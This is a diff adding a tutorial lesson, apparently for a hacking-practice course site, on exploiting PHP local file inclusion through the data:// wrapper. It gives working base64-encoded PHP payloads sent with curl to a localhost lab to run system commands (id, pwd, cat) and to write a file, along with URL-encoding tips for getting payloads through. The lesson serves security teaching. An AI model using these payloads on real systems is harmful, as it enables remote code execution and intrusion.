@@ -1858,5 +1858,204 @@
         "text": "Removes HTTP chunked transfer encoding from content."
       }
     ]
+  },
+  {
+    "id": 7,
+    "slug": "data-filter",
+    "title": "Data Filter - LFI",
+    "category": "notes",
+    "blocksFile": "./blocks/data-filter.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "prerequisites": [
+      {
+        "title": "Basic LFI",
+        "slug": "lfi"
+      }
+    ],
+    "blocks": [
+      {
+        "id": "download-lfi-lab",
+        "type": "download",
+        "title": "LFI Practice Lab",
+        "text": "Download the vulnerable PHP lab and payload collection.",
+        "fileName": "lfi-input-lab.zip",
+        "url": "/downloads/lfi-input-lab.zip",
+        "size": "4kb"
+      },
+      {
+        "type": "section_heading",
+        "id": "data-wrapper-lfi",
+        "text": "Data Wrapper - LFI"
+      },
+      {
+        "type": "explanation",
+        "id": "data-wrapper-intro",
+        "title": "data://",
+        "items": [
+          "The data:// wrapper allows embedding file content directly inside a URL.",
+          "Basic structure: <highlight>data://[mime-type],[data]</highlight>",
+          "It works when vulnerable code uses functions like <highlight>include($_GET['file']);</highlight>",
+          "<highlight>allow_url_include=On</highlight> is required when using include() with URL wrappers.",
+          "<highlight>allow_url_fopen=On</highlight> must be enabled for URL wrapper support.",
+          "If URL wrappers are disabled in php.ini, this technique will not work."
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "data-execution-flow",
+        "text": "Execution Flow"
+      },
+      {
+        "type": "explanation",
+        "id": "data-execution-chain",
+        "title": "How Code Executes",
+        "items": [
+          "The application calls include($_GET['file']).",
+          "The data:// wrapper loads the provided content.",
+          "If base64 is specified, PHP decodes the content automatically.",
+          "The decoded content is treated as a PHP file.",
+          "Any PHP code inside executes on the server."
+        ]
+      },
+      {
+        "type": "order_block",
+        "id": "data-read-step-1",
+        "text": "Basic execution attempt using raw payload."
+      },
+      {
+        "type": "code_block",
+        "id": "data-read-raw-request",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=data://text/plain,<?php system('id'); ?>\""
+      },
+      {
+        "type": "output_block",
+        "id": "data-read-error-output",
+        "code": "curl: (3) URL rejected: Malformed input to a URL function"
+      },
+      {
+        "type": "explanation",
+        "id": "data-read-error-explanation",
+        "title": "Why It Failed",
+        "items": [
+          "Special characters like <highlight>< ? > ' </highlight> break URL parsing.",
+          "The failure occurs at the HTTP transport layer, not inside PHP.",
+          "Raw payloads can work only if properly URL-encoded.",
+          "To make transport safer and more reliable, Base64 encoding is used."
+        ]
+      },
+      {
+        "type": "order_block",
+        "id": "data-read-step-2",
+        "text": "Convert the payload to Base64."
+      },
+      {
+        "type": "code_block",
+        "id": "data-read-base64-generate",
+        "code": "echo -n \"<?php system('id'); ?>\" | base64"
+      },
+      {
+        "type": "output_block",
+        "id": "data-read-base64-output",
+        "code": "PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="
+      },
+      {
+        "type": "code_block",
+        "id": "data-read-final-request",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==\""
+      },
+      {
+        "type": "output_block",
+        "id": "data-read-success-output",
+        "code": "uid=1000(azid) gid=1000(azid) groups=1000(o) ..."
+      },
+      {
+        "type": "section_heading",
+        "id": "data-transport-pitfalls",
+        "text": "Transport Encoding Pitfalls"
+      },
+      {
+        "type": "explanation",
+        "id": "data-transport-issues",
+        "title": "Why Base64 Sometimes Breaks",
+        "items": [
+          "In URLs, <highlight>+</highlight> is interpreted as a space.",
+          "<highlight>&</highlight> splits query parameters.",
+          "<highlight>=</highlight> may interfere with parameter parsing.",
+          "<highlight>%</highlight> starts URL encoding sequences.",
+          "If Base64 contains +, /, or =, it must be URL-encoded before sending.",
+          "Always assume HTTP transport can mutate your payload."
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "data-wrapper-file-write",
+        "text": "File Writing Using data://"
+      },
+      {
+        "type": "order_block",
+        "id": "data-write-step-1",
+        "text": "If direct output is not returned, use file writing for blind execution confirmation."
+      },
+      {
+        "type": "code_block",
+        "id": "data-write-generate-payload",
+        "code": "echo -n \"<?php file_put_contents('file.txt','HACKED'); ?>\" | base64"
+      },
+      {
+        "type": "output_block",
+        "id": "data-write-base64-output",
+        "code": "PD9waHAgZmlsZV9wdXRfY29udGVudHMoJ2ZpbGUudHh0JywnSEFDS0VEJyk7ID8+"
+      },
+      {
+        "type": "code_block",
+        "id": "data-write-final-request",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=data://text/plain;base64,PD9waHAgZmlsZV9wdXRfY29udGVudHMoJ2ZpbGUudHh0JywnSEFDS0VEJyk7ID8%2B\""
+      },
+      {
+        "type": "order_block",
+        "id": "data-write-step-2",
+        "text": "The file is written in the server's current working directory."
+      },
+      {
+        "type": "order_block",
+        "id": "data-working-directory-discovery",
+        "text": "To confirm the working directory:"
+      },
+      {
+        "type": "code_block",
+        "id": "data-pwd-generate",
+        "code": "echo -n \"<?php system('pwd'); ?>\" | base64"
+      },
+      {
+        "type": "section_heading",
+        "id": "data-verify-write",
+        "text": "Verify File Content"
+      },
+      {
+        "type": "code_block",
+        "id": "data-verify-generate",
+        "code": "echo -n \"<?php system('cat file.txt'); ?>\" | base64"
+      },
+      {
+        "type": "output_block",
+        "id": "data-verify-base64-output",
+        "code": "PD9waHAgc3lzdGVtKCdjYXQgZmlsZS50eHQnKTsgPz4="
+      },
+      {
+        "type": "code_block",
+        "id": "data-verify-url-encode",
+        "code": "python3 -c \"import urllib.parse; print(urllib.parse.quote('PD9waHAgc3lzdGVtKCdjYXQgZmlsZS50eHQnKTsgPz4='))\""
+      },
+      {
+        "type": "code_block",
+        "id": "data-verify-final-request",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmlsZS50eHQnKTsgPz4%3D\""
+      },
+      {
+        "type": "order_block",
+        "id": "data-final-note",
+        "text": "Always URL-encode Base64 payloads before sending them via GET parameters. Reliable exploitation requires controlling every encoding layer."
+      }
+    ]
   }
 ]
